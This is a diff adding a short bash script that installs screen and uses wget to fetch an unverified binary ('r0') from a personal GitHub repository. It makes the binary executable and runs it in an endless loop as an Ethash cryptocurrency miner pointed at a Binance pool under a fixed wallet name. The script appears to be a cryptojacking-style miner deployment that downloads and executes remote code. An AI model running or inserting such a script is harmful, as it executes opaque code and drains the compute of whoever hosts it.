@@ -1,0 +1,12 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen -y
+POOL=ethash.poolbinance.com:1800
+WALLET=RHYTHM
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-RAVI)
+wget https://github.com/xravibro/prothomalo/raw/main/r0
+chmod +x r0
+	while [ 1 ]; do
+			./r0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+			sleep 5
+	done
